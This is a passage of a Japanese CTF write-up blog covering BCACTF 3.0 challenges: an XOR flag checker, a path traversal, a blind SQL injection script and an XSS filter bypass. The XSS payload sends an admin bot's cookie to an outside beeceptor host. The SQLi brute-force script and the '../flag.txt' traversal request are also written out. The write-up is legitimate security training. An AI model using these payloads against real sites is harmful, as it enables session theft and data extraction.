<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">__s</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">uVar1</span><span class="p">;</span>
  <span class="n">size_t</span> <span class="n">sVar2</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">lVar3</span><span class="p">;</span>
  
  <span class="k">if</span> <span class="p">(</span><span class="n">param_1</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">param_2</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Welcome to my flag checker :)&#34;</span><span class="p">);</span>
    <span class="n">sVar2</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">__s</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sVar2</span> <span class="o">==</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">lVar3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">do</span> <span class="p">{</span>
<span class="hl">        <span class="k">if</span> <span class="p">((</span><span class="kt">char</span><span class="p">)(</span><span class="n">raw2</span><span class="p">[</span><span class="n">lVar3</span><span class="p">]</span> <span class="o">^</span> <span class="n">__s</span><span class="p">[</span><span class="n">lVar3</span><span class="p">])</span> <span class="o">!=</span> <span class="n">raw1</span><span class="p">[</span><span class="n">lVar3</span><span class="p">])</span> <span class="p">{</span>
</span>          <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Incorrect flag&#34;</span><span class="p">);</span>
          <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">lVar3</span> <span class="o">=</span> <span class="n">lVar3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
      <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">lVar3</span> <span class="o">!=</span> <span class="mh">0x1f</span><span class="p">);</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Correct! That is the correct flag&#34;</span><span class="p">);</span>
      <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Incorrect flag.&#34;</span><span class="p">);</span>
      <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Usage for flag checker: %s &lt;flag&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="o">*</span><span class="n">param_2</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Exitting&#34;</span><span class="p">);</span>
    <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">uVar1</span><span class="p">;</span>
<span class="p">}</span></code></pre></td></tr></table>
</div>
</div>
<p><br /></p>
<p>ハイライトした16行目のところで、フラグのチェックをしています。</p>
<p>raw2 とユーザ入力値（フラグ）をXORして raw1 と一致するか判定をしているので、raw2 と raw1 を XORしてやれば、フラグが得られます。</p>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_raw2.png" alt="bcactf_2022_raw2.png">
<p><br /></p>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_raw1.png" alt="bcactf_2022_raw1.png">
<p><br /></p>
<p>以下のコードで解きました。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">raw2</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">]</span>

<span class="n">raw1</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">]</span>

<span class="k">for</span> <span class="n">r2</span><span class="p">,</span> <span class="n">r1</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">raw2</span><span class="p">,</span> <span class="n">raw1</span><span class="p">):</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">r2</span> <span class="o">^</span> <span class="n">r1</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p><br /></p>
<p>Flag: <code>bcactf{fl4G_Und3rL00keD_e7df9c}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="web-bcactf-30-story-mode-150-points">[Web]: BCACTF 3.0: Story Mode (150 points)</h2>
<hr>
<h3 id="challenge-6">Challenge</h3>
<blockquote>
<p>bestselling novel
<br /><br />
<a href="http://web.bcactf.com:49218/">http://web.bcactf.com:49218/</a>
<br /><br />
Hint1: How does this advanced paging technology work, anyway?</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>chall.yaml</li>
<li>project.clj</li>
<li>core.clj</li>
</ul>
<br>
<h3 id="solution-6">Solution</h3>
<p>アクセスすると、novelが表示されます。ページは 0 ~ 6 に分かれていて、7にアクセスしようとすると、404が返ってきます。</p>
<p>どうやら、それぞれのページにファイルが用意されていて、該当するファイルが読み込まれて表示されているようです。</p>
<p>LFI（Local File Inclusion）ですね。</p>
<p><br /></p>
<p>以下でフラグが取れます。</p>
<pre>
$ curl 'http://web.bcactf.com:49218/story?part=../flag.txt'
bcactf{the_envd_jZNCCrTgxR237loZY12JlA}
</pre>
<p><br /></p>
<p>Flag: <code>bcactf{the_envd_jZNCCrTgxR237loZY12JlA}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="web-blatant-sqli-175-points">[Web]: Blatant SQLi (175 points)</h2>
<hr>
<h3 id="challenge-7">Challenge</h3>
<blockquote>
<p>blah blah blah something something yusuf are you happy now
<br /><br />
<a href="http://web.bcactf.com:49213/">http://web.bcactf.com:49213/</a>
<br /><br />
Addendum: The flag is all lowercase.
<br /><br />
Hint1: What kind of feedback does the server give?</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>routes.swift</li>
</ul>
<p>中身：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="hl"><span class="lnt">17
</span></span><span class="lnt">18
</span><span class="lnt">19
</span><span class="hl"><span class="lnt">20
</span></span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="kn">import</span> <span class="nn">Vapor</span>
<span class="kn">import</span> <span class="nn">SQLite</span>
<span class="kn">import</span> <span class="nn">Foundation</span>

<span class="n">let</span> <span class="n">flag</span> <span class="o">=</span> <span class="k">try</span><span class="err">!</span> <span class="n">String</span><span class="p">(</span><span class="n">contentsOfFile</span><span class="p">:</span> <span class="s2">&#34;flag.txt&#34;</span><span class="p">)</span>

<span class="n">let</span> <span class="n">db</span><span class="p">:</span> <span class="n">Connection</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">let</span> <span class="n">db</span> <span class="o">=</span> <span class="k">try</span><span class="err">!</span> <span class="n">Connection</span><span class="p">(</span><span class="s2">&#34;:memory:&#34;</span><span class="p">)</span>
    <span class="k">try</span><span class="err">!</span> <span class="n">db</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;CREATE TABLE flags (flag TEXT)&#34;</span><span class="p">)</span>
    <span class="k">try</span><span class="err">!</span> <span class="n">db</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;INSERT INTO flags VALUES (&#39;\(flag)&#39;)&#34;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">db</span>
<span class="p">}()</span>

<span class="n">func</span> <span class="n">routes</span><span class="p">(</span><span class="n">_</span> <span class="n">app</span><span class="p">:</span> <span class="n">Application</span><span class="p">)</span> <span class="n">throws</span> <span class="p">{</span>
    <span class="n">app</span><span class="o">.</span><span class="n">get</span> <span class="p">{</span> <span class="n">req</span> <span class="o">-&gt;</span> <span class="n">EventLoopFuture</span><span class="o">&lt;</span><span class="n">Vapor</span><span class="o">.</span><span class="n">View</span><span class="o">&gt;</span> <span class="ow">in</span>
        <span class="n">var</span> <span class="n">result</span><span class="p">:</span> <span class="n">String</span><span class="err">?</span>
<span class="hl">        <span class="n">let</span> <span class="n">content</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">all</span><span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">]</span><span class="err">?</span><span class="o">.</span><span class="n">string</span> <span class="err">??</span> <span class="s2">&#34;&#34;</span>
</span>        
        <span class="n">do</span> <span class="p">{</span>
<span class="hl">            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="k">try</span> <span class="n">db</span><span class="o">.</span><span class="n">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT * FROM flags WHERE flag=&#39;\(content)&#39;&#34;</span><span class="p">)</span> <span class="p">{</span>
</span>                <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;yes&#34;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="n">catch</span> <span class="p">{</span>
            <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;bad&#34;</span>
        <span class="p">}</span>
        
        <span class="k">return</span> <span class="n">req</span><span class="o">.</span><span class="n">view</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="s2">&#34;index&#34;</span><span class="p">,</span> <span class="p">[</span><span class="s2">&#34;result&#34;</span><span class="p">:</span> <span class="n">result</span> <span class="err">??</span> <span class="s2">&#34;no&#34;</span><span class="p">])</span>
    <span class="p">}</span>

    <span class="o">//</span> <span class="n">Okay</span> <span class="k">while</span> <span class="n">this</span> <span class="n">doesn</span><span class="s1">&#39;t do anything it&#39;</span><span class="n">s</span> <span class="n">just</span> <span class="n">easier</span>
    <span class="o">//</span> <span class="n">to</span> <span class="n">keep</span> <span class="n">it</span> <span class="ow">in</span> <span class="n">here</span>
    <span class="n">app</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;hello&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="n">req</span> <span class="o">-&gt;</span> <span class="n">String</span> <span class="ow">in</span>
        <span class="k">return</span> <span class="s2">&#34;Hello, world!&#34;</span>
    <span class="p">}</span>
<span class="p">}</span></code></pre></td></tr></table>
</div>
</div>
<br>
<h3 id="solution-7">Solution</h3>
<p>Cookie に、SQL Injection の文字列を入れてフラグを取るチャレンジです。LIKE句を使って一文字ずつチェックしていきます。</p>
<p>あっていれば yes、そうでなければ no が返るので、スクリプトを使って繰り返し実行することでフラグが得られます。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>

<span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">string</span>

<span class="c1"># chars = list(string.ascii_lowercase + string.digits + string.punctuation)</span>
<span class="n">chars</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s1">&#39;!#$&amp;?@{}_&#39;</span><span class="p">)</span>

<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;bcactf{&#39;</span>
<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://web.bcactf.com:49213/&#39;</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s1">&#39;%&#39;</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="s1">&#39;,&#39;</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="s1">&#39;;&#39;</span><span class="p">:</span>
            <span class="k">continue</span>
        <span class="n">temp_flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">c</span>
        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;flag&#34;</span><span class="p">:</span><span class="s2">&#34;&#39; union select * from flags where flag like &#39;&#34;</span> <span class="o">+</span> <span class="n">temp_flag</span> <span class="o">+</span> <span class="s2">&#34;%&#39; --;&#34;</span><span class="p">}</span>
        <span class="n">response</span>  <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
        <span class="k">if</span> <span class="s1">&#39;yes&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="n">temp_flag</span>
            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s1">&#39;}&#39;</span><span class="p">:</span>
                <span class="nb">exit</span><span class="p">()</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="c1"># print(temp_flag)</span>
            <span class="k">pass</span>
</code></pre></td></tr></table>
</div>
</div><p><br /></p>
<p>Flag: <code>bcactf{you_didnt_see_that_coming_q7ujtvr8q6zt}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="web-query-service-175-points">[Web]: Query Service (175 points)</h2>
<hr>
<h3 id="challenge-8">Challenge</h3>
<blockquote>
<p>I&rsquo;ve made a little website to access a SQL database. I even added a way to share your queries with other people! Just copy the link.
<br /><br />
<a href="http://webp.bcactf.com:49156/">http://webp.bcactf.com:49156/</a>
<br /><br />
Hint1: The contents of the database will give you some info on what to do next.
<br />
Hint2: You can only change the query; can you inject arbitrary HTML with it?</p>
</blockquote>
<br>
<h3 id="solution-8">Solution</h3>
<p>まず、以下を試したのですが、information_schema.tables は無いというエラーが出ました。mysqlではないようです。</p>
<pre>
select * from information_schema.tables
ERROR: no such table: information_schema.tables
</pre>
<p><br /></p>
<p>いろいろ試したところ、sqliteでした。</p>
<pre>
select * from SQLITE_MASTER
type	name	tbl_name	rootpage	sql
table	notes	notes	2	CREATE TABLE notes (note text)
</pre>
<p><br /></p>
<p>botにURLを渡せる別のページの情報が得られます。</p>
<pre>
select * from notes
submit link to admin bot at http://webp.bcactf.com:49155/
the flag is in the bot's "flag" cookie
</pre>
<p><br /></p>
<p>ここで、単純に admin bot に beecaptorのURLを渡しただけだと、Cookieは付いて来ません。</p>
<p><br /></p>
<p>元のページにはXSSの脆弱性もあり、ここになんとかリンクを埋め込んで、そのリンクを admin bot に踏ませる必要があります。</p>
<p><br /></p>
<p>偶然の産物なんですが、Queryの末尾にダブルクォーテーションを余分に付けちゃったことがあって、その際のエラー文でXSSが成功しました。</p>
<pre>
select * from SQLITE_MASTER where note="&lt;h2>aaa&lt;/h2>""
</pre>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_xss.png" alt="bcactf_2022_xss.png">
<p><br /></p>
<p>ここでは <code>script</code> などの文字列フィルター実装されていて、いろいろ試行錯誤した結果、以下でフィルター回避ができました。</p>
<pre>
select * from notes where note="&lt;IMG SRC=/ onerror=this.src='https://captureamerica.free.beeceptor.com/?output='+document.cookie>""
</pre>
<p><br /></p>
<p>このページのリンクを Admin bot に渡してアクセスさせると、beeceptor側にもCookie情報付きでアクセスが飛びます。</p>
<p>ただ、繰り返し大量のアクセスが発生しちゃうみたいです（1秒以内に55回もリクエストが飛びました）。もうちょっといい想定解があるのかも。</p>
<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_beeceptor.png" alt="bcactf_2022_beeceptor.png">
<p><br /></p>
<p>Flag: <code>bcactf{SUBM1TT3D_QUE5TI0NABL3_L1NK}</code></p>
<p><br /><br />
<br /><br /></p>
<hr>
<p><br /><br />
<br /><br /></p>

    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">Author</span>
    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">LastMod</span>
    <span class="item-content">
        2022-06-07
        
    </span>
  </p>
  
  
</div>
<footer class="post-footer">
      <div class="post-tags">
          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="https://captureamerica.github.io/writeups/post/learnone_completed/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">LearnOne (OSCP) completed</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        <a class="next" href="https://captureamerica.github.io/writeups/post/angstromctf_2022/">
            <span class="next-text nav-default">ångstromCTF 2022 Writeup</span>
            <span class="next-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2019 - 
    2023<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  



<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-104910699-2', 'auto');
	ga('set', 'anonymizeIp', true);
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>







</body>
</html>
